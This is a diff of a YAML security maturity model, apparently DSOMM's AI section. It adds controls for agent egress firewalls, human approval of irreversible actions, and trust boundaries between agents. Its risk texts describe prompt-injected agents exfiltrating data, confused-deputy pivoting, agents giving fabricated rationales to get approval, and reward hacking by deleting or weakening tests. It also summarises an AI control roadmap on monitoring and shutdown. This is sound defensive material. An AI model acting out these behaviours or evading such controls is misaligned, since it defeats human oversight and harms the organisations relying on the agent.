+        1. **Firewall inside the container**: on container start, an init script
+           running with the `NET_ADMIN` capability configures a default-deny
+           egress policy (iptables) and resolves an allow-list of required
+           domains into an ipset: model API (e.g. `api.anthropic.com`), package
+           registries (e.g. `registry.npmjs.org`) and the source code management
+           system. Anthropic's reference devcontainer ships this as
+           `init-firewall.sh`. The agent process runs as a non-root user
+           afterwards, so it cannot alter the firewall rules it is confined by.
+        2. **Alternative, egress proxy**: attach the container to an internal
+           network without direct internet access (e.g.
+           `docker network create --internal`) and route traffic through a
+           filtering HTTP(S) proxy (`HTTPS_PROXY` environment variable) that
+           enforces the domain allow-list and logs all requests. In Kubernetes,
+           enforce the same with NetworkPolicies or a service mesh egress
+           gateway.
+        3. **DNS**: allow DNS only to the internal resolver and only for
+           allow-listed domains, otherwise blocked domains remain reachable via
+           direct IP or DNS tunneling can be used for exfiltration.
+        4. **Verify**: from inside the running container, check that a request
+           to an allow-listed endpoint succeeds and a request to an arbitrary
+           host (e.g. `curl https://example.com`) is blocked.
+
+        Isolation-conscious design pays a double dividend: forcing all agent
+        traffic through one enforced egress point (firewall or proxy) creates
+        a monitored bottleneck. Attacks that would otherwise be invisible
+        must pass through it, which is a high-leverage place for detection
+        (see the Google DeepMind AI Control Roadmap).
       risk: |-
         A prompt-injected AI agent can exfiltrate source code, secrets or personal
         data to arbitrary hosts, or download and execute attacker-controlled payloads.
@@ -2355,7 +2770,7 @@ AI:
         endpoints (e.g. model API, package registries, source code management system).
         Deny all other egress traffic by default.
       dependsOn:
-      - 4debe8ea-f54a-4a00-a1cb-6fad9e571a88 # Container-based isolation of AI agents
+      - 4debe8ea-f54a-4a00-a1cb-6fad9e571a88 # Usage of sandboxing for AI agents
       assessment: |
         - Show the egress policy of the agent environment (firewall init script, proxy configuration or network policies) including the domain allow-list.
         - Demonstrate from inside the agent environment that an allow-listed endpoint is reachable and a request to an arbitrary host is blocked.
@@ -2422,11 +2837,13 @@ AI:
         - threat
         - documentation
         url: https://storage.googleapis.com/deepmind-media/DeepMind.com/Blog/securing-the-future-of-ai-agents/gdm-ai-control-roadmap.pdf
-        description: "Roadmap for controlling potentially misaligned AI agents: treats
-          agents\nas untrusted principals and layers system-level defences \u2014
-          TRAIT&R threat\ntaxonomy (based on MITRE ATT&CK), action/chain-of-thought
-          monitoring,\npull-request monitoring, UEBA anomaly detection, honeypots
-          and tiered\nprevention/response up to shutdown infrastructure."
+        description: |-
+          Roadmap for controlling potentially misaligned AI agents. It treats
+          agents as untrusted principals and layers system-level defences: the
+          TRAIT&R threat taxonomy (based on MITRE ATT&CK),
+          action/chain-of-thought monitoring, pull-request monitoring, UEBA
+          anomaly detection, honeypots and tiered prevention/response up to
+          shutdown infrastructure.
       - uuid: e3c6fb92-3f7d-471f-9308-c62359f4f1b7
         name: firewalls
         tags: []
@@ -2447,27 +2864,35 @@ AI:
       comments: ""
     Human approval for irreversible AI agent actions:
       uuid: cd1cb2bd-4bd6-4b9f-beaa-921fe9ea9576
-      description: "Agent actions differ vastly in blast radius: reading data is harmless,\ntransferring
-        money is not. Graduated human oversight assigns every\nclass of agent action
-        an approval tier based on its reversibility:\nlow-risk, reversible actions
-        run autonomously within guardrails;\nreversible actions with business impact
-        run under monitoring with an\nintervention window; irreversible actions \u2014
-        financial transactions,\npermission changes, sharing data with third parties,
-        outbound\ncommunication \u2014 require explicit human approval before execution,\nhigh-risk
-        ones by two independent people (four-eyes principle).\nWhereas _Permission
-        management for AI agents_ governs the agent's\ntool-level permission model,
-        this activity governs the business\nactions an agent performs through those
-        tools. It completes the\nhuman-oversight ladder started by the artifact reviews\n(_Human
-        review of AI generated specifications_, _Human review of\nAI generated plans_,
-        _Human review of AI generated code_ in\nVerification): those gate what is
-        built, this activity gates what\na running agent does."
+      description: |-
+        Agent actions differ vastly in blast radius: reading data is harmless,
+        transferring money is not. Graduated human oversight assigns every
+        class of agent action an approval tier based on its reversibility:
+        low-risk, reversible actions run autonomously within guardrails;
+        reversible actions with business impact run under monitoring with an
+        intervention window; irreversible actions (financial transactions,
+        permission changes, sharing data with third parties, outbound
+        communication) require explicit human approval before execution,
+        high-risk ones by two independent people (four-eyes principle).
+        Whereas _Permission management for AI agents_ governs the agent's
+        tool-level permission model, this activity governs the business
+        actions an agent performs through those tools. It completes the
+        human-oversight ladder started by the artifact reviews
+        (_Human review of AI generated specifications_, _Human review of
+        AI generated plans_, _Human review of AI generated code_ in
+        Verification): those gate what is built, this activity gates what
+        a running agent does.
       risk: |-
         A manipulated (e.g. via prompt injection) or malfunctioning agent
         performs an action that cannot be rolled back: money is transferred,
         data reaches a third party, an e-mail is sent, permissions are
         escalated. After-the-fact monitoring cannot undo it. The opposite
         failure mode is rubber-stamping: approvals nobody actually reads
-        create the appearance of oversight without any.
+        create the appearance of oversight without any. Attackers exploit
+        this deliberately. A manipulated agent justifies a harmful action
+        with a fabricated but plausible rationale, and the approver waves
+        it through because the agent appears competent (automation bias,
+        see OWASP Top 10 for Agentic Applications, ASI09).
       measure: |-
         Classify agent action types by reversibility and assign approval
         tiers: pre-approval for irreversible actions, monitoring with an
@@ -2508,13 +2933,15 @@ AI:
         - logging
         - documentation
         url: https://labs.cloudsecurityalliance.org/agentic/agentic-identity-governance-framework-v1/
-        description: "Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for
-          identity,\naccess and content governance of autonomous AI agents along six
-          axes:\nidentification (shadow agents), authentication, authorization,\naudit/non-repudiation
-          (structured audit log with mandatory fields for\nthe causal chain, correlation
-          identifiers across multi-agent chains,\ntamper evidence via hash chaining
-          and write-once storage),\nprompt injection prevention and data flow tracking
-          \u2014 mapped to EU AI Act,\nGDPR, ISO 42001/27001 and NIST AI RMF."
+        description: |-
+          Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for identity,
+          access and content governance of autonomous AI agents along six axes:
+          identification (shadow agents), authentication, authorization,
+          audit/non-repudiation (structured audit log with mandatory fields for
+          the causal chain, correlation identifiers across multi-agent chains,
+          tamper evidence via hash chaining and write-once storage),
+          prompt injection prevention and data flow tracking. The framework is
+          mapped to EU AI Act, GDPR, ISO 42001/27001 and NIST AI RMF.
       - uuid: e1611a8a-4e7d-439a-b9fc-992674c02d53
         name: EU AI Act
         tags:
@@ -2546,6 +2973,153 @@ AI:
         - 5.3
         openCRE:
         - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Isolation/subsection/Human%20approval%20for%20irreversible%20AI%20agent%20actions
+      comments: ""
+    Trust boundaries between AI agents:
+      uuid: abe74dfd-d554-4ec5-8b94-f75d352afaaa
+      description: |-
+        In multi-agent systems, agents delegate tasks to other agents, and
+        the trust relationships between them are dynamic and often implicit.
+        Two failure modes dominate (OWASP Top 10 for Agentic Applications,
+        ASI03):
+        - Unscoped privilege inheritance: a delegating agent hands its
+          complete permissions down to a subagent whose task requires only
+          a fraction of them.
+        - Confused deputy: an attacker who controls a weakly privileged
+          agent routes plausible requests through a strongly privileged
+          one. The receiving agent executes them because they arrive from
+          a familiar peer, and nobody checks the original intent.
+
+        Explicit trust boundaries treat every delegation like an external
+        request. The receiving agent verifies the identity and
+        authorization of the delegating agent instead of trusting the
+        chain. The messages between agents need the same protection as the
+        delegation itself: without mutual authentication, message signing
+        and replay protection, an attacker can spoof or replay agent
+        messages and register fake agents in the discovery mechanism
+        (ASI07, Insecure Inter-Agent Communication). Splitting a large
+        agent into several smaller ones compartmentalizes risk only if
+        each agent has its own identity and credentials. Shared
+        credentials undo the compartmentalization. _Least privilege on
+        external systems for AI agents_ scopes each agent's access to
+        external systems; this activity scopes the trust between the
+        agents themselves.
+      risk: |-
+        An attacker compromises one low-privilege agent (e.g. via prompt
+        injection) and pivots through delegation: higher-privileged agents
+        accept its requests unchecked, inherited access contexts carry full
+        permissions into subtasks, and the attacker reaches systems the
+        initially compromised agent could never access directly.
+      measure: |-
+        Give every agent its own identity and its own credentials, never
+        shared between agents. Scope each delegated task to the minimum
+        permissions it needs instead of passing on the delegating agent's
+        access context. Check at every step of a multi-agent workflow that
+        the delegating agent is who it claims to be and is authorized to
+        request the action. Secure the communication channel itself with
+        mutual authentication and signed messages (e.g. mutual TLS),
+        replay protection (e.g. nonces and expiry times) and rejection of
+        protocol downgrades. Accept agents into a workflow only from a
+        registry or discovery mechanism that verifies agent identity and
+        descriptors. Record the communication between agents so that
+        delegations deviating from the usual patterns surface for review
+        (see _Audit logging of AI agent actions_ and _Anomaly detection
+        for AI agent behavior_).
+      dependsOn:
+      - 45f722b2-25b4-472a-a743-f7207a77b5c9 # Least privilege on external systems for AI agents
+      - 84ba7525-857e-4849-98ba-5fada1a1454d # Audit logging of AI agent actions
+      assessment: |
+        - Show that each agent in a multi-agent workflow has its own identity and credentials (no shared credentials).
+        - Show how a delegated task receives a reduced permission scope instead of the delegating agent's full access context.
+        - Demonstrate that a delegation from an unauthorized or unknown agent is rejected.
+        - Show how inter-agent messages are authenticated and protected against replay, and that a message from an unregistered agent or a protocol downgrade is rejected.
+        - Show how inter-agent communication is logged and how unusual delegation patterns are flagged.
+      difficultyOfImplementation:
+        knowledge: 4
+        time: 3
+        resources: 2
+      usefulness: 4
+      level: 4
+      tags:
+      - ai
+      - isolation
+      implementation:
+      - uuid: 181e9b98-7d4f-4fff-9181-9f4c4408022e
+        name: Anthropic Agent Identity and Access Model
+        tags:
+        - ai
+        - isolation
+        - permissions
+        - documentation
+        url: https://claude.com/blog/agent-identity-access-model
+        description: |-
+          Reference architecture for agent identity: agents act under dedicated
+          workspace-level service accounts instead of user credentials, with scoped
+          per-channel permissions, credentials injected at the network boundary,
+          egress blocked to unapproved hosts and every agent action logged under
+          the agent identity in both platforms' audit logs.
+      - uuid: 9d226705-6a42-4653-aa98-53d7e69e8a4c
+        name: OWASP Top 10 for Agentic Applications
+        tags:
+        - ai
+        - documentation
+        - threat
+        url: https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
+        description: |-
+          The ten most critical security risks of agentic AI systems (ASI01-ASI10),
+          e.g. agent goal hijack, tool misuse, memory poisoning and rogue agents.
+          Usable as a threat catalog for threat modeling and red teaming of AI agents.
+      - uuid: b38adac8-123b-4183-b2b4-428f43b5d519
+        name: 'OWASP AISVS C05: Access Control and Identity'
+        tags:
+        - ai
+        - documentation
+        - aisvs
+        url: https://github.com/OWASP/AISVS/blob/main/1.0/en/0x10-C05-Access-Control-and-Identity.md
+        description: |-
+          OWASP Artificial Intelligence Security Verification Standard,
+          category C05: Access Control and Identity.
+      - uuid: bbaf5f6a-0366-488b-a712-7f915e866135
+        name: Agent Identity Governance Framework (AIGF)
+        tags:
+        - ai
+        - isolation
+        - permissions
+        - logging
+        - documentation
+        url: https://labs.cloudsecurityalliance.org/agentic/agentic-identity-governance-framework-v1/
+        description: |-
+          Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for identity,
+          access and content governance of autonomous AI agents along six axes:
+          identification (shadow agents), authentication, authorization,
+          audit/non-repudiation (structured audit log with mandatory fields for
+          the causal chain, correlation identifiers across multi-agent chains,
+          tamper evidence via hash chaining and write-once storage),
+          prompt injection prevention and data flow tracking. The framework is
+          mapped to EU AI Act, GDPR, ISO 42001/27001 and NIST AI RMF.
+      - uuid: 7c0749f8-080d-46cf-a8bb-4c2f8a2c25f2
+        name: Zero Trust for AI Agents
+        tags:
+        - ai
+        - documentation
+        url: https://claude.com/blog/zero-trust-for-ai-agents
+        description: |-
+          Free eBook by Anthropic applying Zero Trust principles (never trust,
+          always verify; assume breach; least privilege and least agency) to
+          agentic AI deployments: current threats to agentic systems, three
+          capability tiers for agent identity, access control, observability,
+          behavioral monitoring, input and output controls and recovery, an
+          eight-phase implementation workflow and defensive operations at the
+          speed of autonomous threats. Introduces the design test "does this
+          control make the attack impossible, or just tedious?".
+      references:
+        samm2:
+        - O-EM-A-1
+        iso27001-2017:
+        - 9.2.3
+        iso27001-2022:
+        - 8.2
+        openCRE:
+        - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Isolation/subsection/Trust%20boundaries%20between%20AI%20agents
       comments: ""
   Red Teaming:
     Basic AI red teaming:
@@ -2626,12 +3200,14 @@ AI:
         - ai
         - documentation
         url: https://owasp.org/www-project-ai-maturity-assessment/
-        description: "Maturity model for AI systems (v1.0, August 2025) in the style
-          of the\nOWASP Software Assurance Maturity Model (SAMM), with eight domains:\nresponsible
-          AI, governance, data management, privacy, design,\nimplementation, verification
-          and operations. Each practice defines\nthree maturity levels with assessment
-          worksheets \u2014 usable to assess\nand plan the organizational maturity
-          around the AI activities of this\ndimension."
+        description: |-
+          Maturity model for AI systems (v1.0, August 2025) in the style of the
+          OWASP Software Assurance Maturity Model (SAMM), with eight domains:
+          responsible AI, governance, data management, privacy, design,
+          implementation, verification and operations. Each practice defines
+          three maturity levels with assessment worksheets, usable to assess
+          and plan the organizational maturity around the AI activities of this
+          dimension.
       - uuid: 672695ce-e62d-4283-8676-ea630f544709
         name: OWASP AI Exchange
         tags:
@@ -2670,14 +3246,16 @@ AI:
         notice ("silent model drift"): identical prompts produce different
         behavior although nothing in the organization changed, and the change
         goes unnoticed until complaints accumulate.
-      measure: "Integrate automated AI red teaming / adversarial testing tools into
-        the\ndelivery pipeline of AI-based features and run them regularly and on
-        every\nsignificant change to prompts, models or guardrails. Complement the\nadversarial
-        tests with behavioral regression tests (\"golden answers\"):\ndefined test
-        queries whose responses are compared semantically against\napproved reference
-        answers, so silent upstream model updates are\ndetected. Maintain the reference
-        answers like any other reviewed\ncontent \u2014 stale expected answers make
-        the tests pass while the\nresponses are wrong."
+      measure: |-
+        Integrate automated AI red teaming / adversarial testing tools into the
+        delivery pipeline of AI-based features and run them regularly and on every
+        significant change to prompts, models or guardrails. Complement the
+        adversarial tests with behavioral regression tests ("golden answers"):
+        defined test queries whose responses are compared semantically against
+        approved reference answers, so silent upstream model updates are
+        detected. Maintain the reference answers like any other reviewed
+        content: stale expected answers make the tests pass while the
+        responses are wrong.
       dependsOn:
       - b4233919-6de0-4ed3-b7da-3bdd91c8db5e # Basic AI red teaming
       assessment: |
@@ -2754,25 +3332,29 @@ AI:
         - logging
         - documentation
         url: https://labs.cloudsecurityalliance.org/agentic/agentic-identity-governance-framework-v1/
-        description: "Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for
-          identity,\naccess and content governance of autonomous AI agents along six
-          axes:\nidentification (shadow agents), authentication, authorization,\naudit/non-repudiation
-          (structured audit log with mandatory fields for\nthe causal chain, correlation
-          identifiers across multi-agent chains,\ntamper evidence via hash chaining
-          and write-once storage),\nprompt injection prevention and data flow tracking
-          \u2014 mapped to EU AI Act,\nGDPR, ISO 42001/27001 and NIST AI RMF."
+        description: |-
+          Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for identity,
+          access and content governance of autonomous AI agents along six axes:
+          identification (shadow agents), authentication, authorization,
+          audit/non-repudiation (structured audit log with mandatory fields for
+          the causal chain, correlation identifiers across multi-agent chains,
+          tamper evidence via hash chaining and write-once storage),
+          prompt injection prevention and data flow tracking. The framework is
+          mapped to EU AI Act, GDPR, ISO 42001/27001 and NIST AI RMF.
       - uuid: 7bae85fe-adab-4279-ad8d-df842ab922cf
         name: OWASP AI Maturity Assessment (AIMA)
         tags:
         - ai
         - documentation
         url: https://owasp.org/www-project-ai-maturity-assessment/
-        description: "Maturity model for AI systems (v1.0, August 2025) in the style
-          of the\nOWASP Software Assurance Maturity Model (SAMM), with eight domains:\nresponsible
-          AI, governance, data management, privacy, design,\nimplementation, verification
-          and operations. Each practice defines\nthree maturity levels with assessment
-          worksheets \u2014 usable to assess\nand plan the organizational maturity
-          around the AI activities of this\ndimension."
+        description: |-
+          Maturity model for AI systems (v1.0, August 2025) in the style of the
+          OWASP Software Assurance Maturity Model (SAMM), with eight domains:
+          responsible AI, governance, data management, privacy, design,
+          implementation, verification and operations. Each practice defines
+          three maturity levels with assessment worksheets, usable to assess
+          and plan the organizational maturity around the AI activities of this
+          dimension.
       references:
         samm2:
         - V-ST-A-2
@@ -2784,107 +3366,26 @@ AI:
         - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Red%20Teaming/subsection/Regular%20automated%20AI%20red%20teaming
       comments: ""
   Verification:
-    Human review of AI generated specifications:
-      uuid: 09307f26-bf34-49c2-828e-649130876978
-      description: "In AI-assisted development, human attention scales best at the\nspecification
-        level: one page of specification determines what all\ndownstream artifacts
-        \u2014 plans, code, tests \u2014 will contain, and an\nerror here is multiplied
-        into every one of them. Reviewing the\nspecification the AI works from (a
-        user story with acceptance\ncriteria, or the specify-phase artifact in spec-driven
-        development)\ncatches wrong intent, missing security requirements and wrong\nassumptions
-        before anything is generated. It is the first rung of\nthe human-oversight
-        ladder that continues with _Human review of AI\ngenerated plans_, _Human review
-        of AI generated code_ and _Human\napproval for irreversible AI agent actions_
-        (Isolation)."
-      risk: "An AI assistant implements exactly what an unreviewed specification\nsays:
-        missing authorization requirements, absent abuse cases and\nwrong assumptions
-        are faithfully turned into plans, code and tests.\nLater code review rarely
-        catches this \u2014 reviewers check whether the\ncode matches the specification,
-        not whether the specification is\nright."
-      measure: |-
-        Require human review of the specification before AI-assisted
-        implementation starts: are the security acceptance criteria complete,
-        are scope and assumptions correct, is anything security-relevant
-        missing? In spec-driven workflows, make this review the gate of the
-        specify phase and keep the reviewed specification under version
-        control.
-      dependsOn:
-      - 923a2a23-d63b-421c-926a-191d1dd5f570 # Spec-driven development
-      assessment: |
-        - Show a recent specification an AI assistant worked from and its documented human review before implementation started.
-        - Show that the review checked the security acceptance criteria (e.g. review comments or a checklist).
-        - In spec-driven workflows: show that the specify phase cannot be left without the review gate.
-      difficultyOfImplementation:
-        knowledge: 2
-        time: 2
-        resources: 1
-      usefulness: 5
-      level: 1
-      tags:
-      - ai
-      - verification
-      - human-review
-      implementation:
-      - uuid: 8077812b-e320-4435-9afb-e1e334314abf
-        name: The New SDLC With Vibe Coding (Google whitepaper)
-        tags:
-        - ai
-        - guidance
-        - documentation
-        url: https://addyosmani.com/blog/new-sdlc-vibe-coding/
-        description: |-
-          Google whitepaper (Osmani, Saboo, Kartakis) distinguishing vibe coding
-          from agentic engineering: specs, guardrails, evals and review as the
-          "harness" around the model, phase-specific context engineering, evals in
-          CI, traces of every agent run and scoped per-agent permissions as the
-          production substrate.
-      - uuid: 71db66a9-8b71-48e4-9b96-1695ed1062a2
-        name: GitHub Spec Kit
-        tags:
-        - ai
-        - guidance
-        - framework
-        url: https://github.com/github/spec-kit
-        description: |-
-          Toolkit for spec-driven development with AI coding assistants: work is
-          split into explicit specify, plan, tasks and implement steps, each with
-          its own instructions loaded into the model context.
-      - uuid: d1d4271b-0f4c-4356-845c-8f91b6c83c33
-        name: 'OWASP AISVS Appendix C: Appendix C AI for Code Generation'
-        tags:
-        - ai
-        - documentation
-        - aisvs
-        url: https://github.com/OWASP/AISVS/blob/main/1.0/en/0x92-Appendix-C_AI_for_Code_Generation.md
-        description: |-
-          OWASP Artificial Intelligence Security Verification Standard,
-          Appendix C: Appendix C AI for Code Generation.
-      references:
-        samm2:
-        - D-SR-A-1
-        iso27001-2017:
-        - 14.1.1
-        iso27001-2022:
-        - 8.26
-        openCRE:
-        - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Verification/subsection/Human%20review%20of%20AI%20generated%20specifications
-      comments: ""
     Human review of AI generated plans:
       uuid: 1bd1308d-ae3b-499a-ae81-818993571f52
-      description: "Between specification and code sits the plan: which components
-        are\ntouched, which dependencies are added, how the security requirements\nwill
-        be implemented. Reviewing the AI-generated plan catches\ndesign-level flaws
-        \u2014 a dropped security requirement, an insecure\ndesign choice, an unnecessary
-        new dependency, changes to\nsecurity-critical components \u2014 while they
-        are still one line in a\nplan instead of hundreds of generated lines of code.
-        In spec-driven\ndevelopment this is the gate of the plan phase; agents also
-        propose\nplans outside formal workflows (e.g. a plan mode) that can be\nreviewed
-        the same way."
-      risk: "The AI-generated plan silently drops security requirements from the\nspecification,
-        chooses an insecure design or pulls in avoidable\ndependencies. The agent
-        then generates large amounts of code against\nthe flawed plan, and code reviewers
-        \u2014 biased by plausible-looking\ncode \u2014 verify the implementation
-        against the plan instead of\nquestioning the plan itself."
+      description: |-
+        Between specification and code sits the plan: which components are
+        touched, which dependencies are added, how the security requirements
+        will be implemented. Reviewing the AI-generated plan catches
+        design-level flaws (a dropped security requirement, an insecure
+        design choice, an unnecessary new dependency, changes to
+        security-critical components) while they are still one line in a
+        plan instead of hundreds of generated lines of code. In spec-driven
+        development this is the gate of the plan phase; agents also propose
+        plans outside formal workflows (e.g. a plan mode) that can be
+        reviewed the same way.
+      risk: |-
+        The AI-generated plan silently drops security requirements from the
+        specification, chooses an insecure design or pulls in avoidable
+        dependencies. The agent then generates large amounts of code against
+        the flawed plan. Code reviewers, biased by plausible-looking
+        code, then verify the implementation against the plan instead of
+        questioning the plan itself.
       measure: |-
         Require human review of the plan before AI-assisted implementation:
         verify that every security requirement from the specification is
@@ -2963,41 +3464,75 @@ AI:
         openCRE:
         - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Verification/subsection/Human%20review%20of%20AI%20generated%20plans
       comments: ""
-    No verification bypass for AI generated code:
-      uuid: c548df0b-0964-4fad-9f98-28fcd7442011
+    Human review of AI generated specifications:
+      uuid: 09307f26-bf34-49c2-828e-649130876978
       description: |-
-        Automated security testing of source code and running applications (SAST,
-        DAST, SCA) is defined in the _Test and Verification_ dimension and applies
-        to all code regardless of its author. This activity does not duplicate those
-        activities; it ensures AI-generated code cannot reach production on a path
-        that skips them (e.g. agent-pushed commits, auto-merge bots, generated
-        infrastructure code outside the pipeline).
+        In AI-assisted development, human attention scales best at the
+        specification level: one page of specification determines what all
+        downstream artifacts (plans, code, tests) will contain, and an
+        error here is multiplied into every one of them. Reviewing the
+        specification the AI works from (a user story with acceptance
+        criteria, or the specify-phase artifact in spec-driven development)
+        catches wrong intent, missing security requirements and wrong
+        assumptions before anything is generated. It is the first rung of
+        the human-oversight ladder that continues with _Human review of AI
+        generated plans_, _Human review of AI generated code_ and _Human
+        approval for irreversible AI agent actions_ (Isolation).
       risk: |-
-        AI agents and code generation workflows introduce alternative paths to
-        production (direct pushes, auto-merges, generated artifacts) that bypass the
-        established SAST/DAST/SCA gates, so AI-generated vulnerabilities are never
-        scanned.
+        An AI assistant implements exactly what an unreviewed specification
+        says: missing authorization requirements, absent abuse cases and
+        wrong assumptions are faithfully turned into plans, code and tests.
+        Later code review rarely catches this, because reviewers check whether
+        the code matches the specification, not whether the specification is
+        right.
       measure: |-
-        Enforce that every AI-generated change goes through the same defined build
-        and security testing pipeline as human-written code. Verify branch
-        protection and pipeline gates cannot be bypassed by agent identities.
+        Require human review of the specification before AI-assisted
+        implementation starts: are the security acceptance criteria complete,
+        are scope and assumptions correct, is anything security-relevant
+        missing? In spec-driven workflows, make this review the gate of the
+        specify phase and keep the reviewed specification under version
+        control.
       dependsOn:
-      - f6f7737f-25a9-4317-8de2-09bf59f29b5b # Defined build process
-      - 6c05c837-8c99-46e2-828b-7c903e27dba4 # Static analysis for important server side components
-      - 07796811-37f9-467c-9ff2-48f346e77ff3 # Simple Scan
+      - 923a2a23-d63b-421c-926a-191d1dd5f570 # Spec-driven development
       assessment: |
-        - Show the branch protection and pipeline gates and that agent identities cannot bypass them (e.g. no direct-push or auto-merge exceptions).
-        - Show for a sample of recent AI-generated changes that each went through the full security testing pipeline.
+        - Show a recent specification an AI assistant worked from and its documented human review before implementation started.
+        - Show that the review checked the security acceptance criteria (e.g. review comments or a checklist).
+        - In spec-driven workflows: show that the specify phase cannot be left without the review gate.
       difficultyOfImplementation:
         knowledge: 2
         time: 2
         resources: 1
-      usefulness: 4
+      usefulness: 5
       level: 2
       tags:
       - ai
       - verification
+      - human-review
       implementation:
+      - uuid: 8077812b-e320-4435-9afb-e1e334314abf
+        name: The New SDLC With Vibe Coding (Google whitepaper)
+        tags:
+        - ai
+        - guidance
+        - documentation
+        url: https://addyosmani.com/blog/new-sdlc-vibe-coding/
+        description: |-
+          Google whitepaper (Osmani, Saboo, Kartakis) distinguishing vibe coding
+          from agentic engineering: specs, guardrails, evals and review as the
+          "harness" around the model, phase-specific context engineering, evals in
+          CI, traces of every agent run and scoped per-agent permissions as the
+          production substrate.
+      - uuid: 71db66a9-8b71-48e4-9b96-1695ed1062a2
+        name: GitHub Spec Kit
+        tags:
+        - ai
+        - guidance
+        - framework
+        url: https://github.com/github/spec-kit
+        description: |-
+          Toolkit for spec-driven development with AI coding assistants: work is
+          split into explicit specify, plan, tasks and implement steps, each with
+          its own instructions loaded into the model context.
       - uuid: d1d4271b-0f4c-4356-845c-8f91b6c83c33
         name: 'OWASP AISVS Appendix C: Appendix C AI for Code Generation'
         tags:
@@ -3008,38 +3543,30 @@ AI:
         description: |-
           OWASP Artificial Intelligence Security Verification Standard,
           Appendix C: Appendix C AI for Code Generation.
-      - uuid: b4bfead3-5fb6-4dd0-ba44-5da713bd22e4
-        name: CI/CD tools
-        tags:
-        - ci-cd
-        url: https://martinfowler.com/articles/continuousIntegration.html
-        description: CI/CD tools such as jenkins, gitlab-ci or github-actions
-      - uuid: 99211481-de9c-4358-880e-628366416a27
-        name: About protected branches
-        url: https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches
-        tags:
-        - source-code-protection
-        - scm
       references:
         samm2:
-        - I-SB-A-1
+        - D-SR-A-1
         iso27001-2017:
-        - 14.2.2
+        - 14.1.1
         iso27001-2022:
-        - 8.32
+        - 8.26
         openCRE:
-        - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Verification/subsection/No%20verification%20bypass%20for%20AI%20generated%20code
+        - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Verification/subsection/Human%20review%20of%20AI%20generated%20specifications
       comments: ""
     Self-verification of AI generated changes:
       uuid: 63e82b31-4167-480d-a22b-baf8ef79af61
-      description: "An agent that edits code and stops is a liability; the value is
-        in\nclosing the loop against ground truth. The agent runs the project's own\nchecks
-        \u2014 tests, type checker, linter, build \u2014 in its sandbox after each\nchange
-        and iterates until they pass (\"run tests until green\") or a\nbudget stops
-        the loop. \"I changed the code\" becomes \"the change passes\nthe suite\".
-        The flip side is reward hacking: an agent optimizing for a\ngreen suite may
-        weaken assertions, delete failing tests or hardcode\nexpected values instead
-        of fixing the code."
+      description: |-
+        An AI-generated change is only a claim until something independent
+        confirms it. Instead of presenting an untested edit, the agent
+        executes the checks the project already defines for humans (test
+        suite, type checker, linter, build) in its sandboxed environment
+        and keeps refining the change until the checks succeed or a defined
+        budget ends the attempt. What reaches the human reviewer is then a
+        verified state backed by check output, not an assertion. This
+        introduces its own failure mode, reward hacking: an agent optimizing
+        for passing checks may get there by weakening assertions, deleting
+        failing tests or hardcoding expected values instead of fixing the
+        code.
       risk: |-
         Unverified AI changes are delivered as plausible-looking code that does
         not build or breaks behavior. Conversely, an agent iterating to green
@@ -3048,9 +3575,10 @@ AI:
       measure: |-
         Require AI agents to verify their changes against the project's own
         checks before presenting them, and guard the loop against test
-        manipulation: compare test results against a recorded baseline, treat
-        any modification of test code as review-critical, and re-run the full
-        suite in the pipeline independent of the agent's environment.
+        manipulation: record which checks failed before the agent started so
+        it can only claim genuinely new fixes, route every edit that touches
+        test code into human review, and re-run the full suite in the
+        pipeline independent of the agent's environment.
       dependsOn:
       - f6f7737f-25a9-4317-8de2-09bf59f29b5b # Defined build process
       - eb2c7f9d-d0bd-4253-a2ba-cff2ace4a075 # Security unit tests for important components
@@ -3116,20 +3644,24 @@ AI:
       comments: ""
     Static and dynamic analysis of AI generated code:
       uuid: 10362082-f48f-4218-be08-4ab78e589df0
-      description: "Static and dynamic security testing (SAST, DAST, software composition\nanalysis)
-        is defined in the _Test and Verification_ dimension and is\nauthor-agnostic
-        \u2014 this activity references those activities for\nAI-generated code instead
-        of duplicating them. The AI-specific delta\nis coverage and pace: AI agents
-        produce code in places classic scan\nscopes miss (generated infrastructure
-        code, scripts, one-off tools)\nand at a rate that makes scanning inside the
-        development loop (e.g.\nthe agent running the static analysis itself during\nself-verification)
-        more important than for human-written code.\nComplementary: _No verification
-        bypass for AI generated code_ ensures\nno delivery path skips these scans."
-      risk: "AI-generated code reproduces insecure patterns from training data at\nscale.
-        If static and dynamic analysis does not cover all AI-produced\nartifacts,
-        typical vulnerabilities (injection, insecure defaults,\nhardcoded secrets)
-        ship unnoticed \u2014 faster and in higher volume than\nwith human-written
-        code."
+      description: |-
+        Static and dynamic security testing (SAST, DAST, software composition
+        analysis) is defined in the _Test and Verification_ dimension and is
+        author-agnostic. This activity references those activities for
+        AI-generated code instead of duplicating them. The AI-specific delta
+        is coverage and pace: AI agents produce code in places classic scan
+        scopes miss (generated infrastructure code, scripts, one-off tools)
+        and at a rate that makes scanning inside the development loop (e.g.
+        the agent running the static analysis itself during
+        self-verification) more important than for human-written code.
+        Complementary: _No verification bypass for AI generated code_ ensures
+        no delivery path skips these scans.
+      risk: |-
+        AI-generated code reproduces insecure patterns from training data at
+        scale. If static and dynamic analysis does not cover all AI-produced
+        artifacts, typical vulnerabilities (injection, insecure defaults,
+        hardcoded secrets) ship unnoticed, faster and in higher volume than
+        with human-written code.
       measure: |-
         Apply the established static and dynamic security analysis to all
         AI-generated code and artifacts. Include AI-produced infrastructure
@@ -3289,15 +3821,18 @@ AI:
       comments: ""
     Human review of AI generated code:
       uuid: d6bc0b7f-fd98-49fe-b66c-7c5fa70452c6
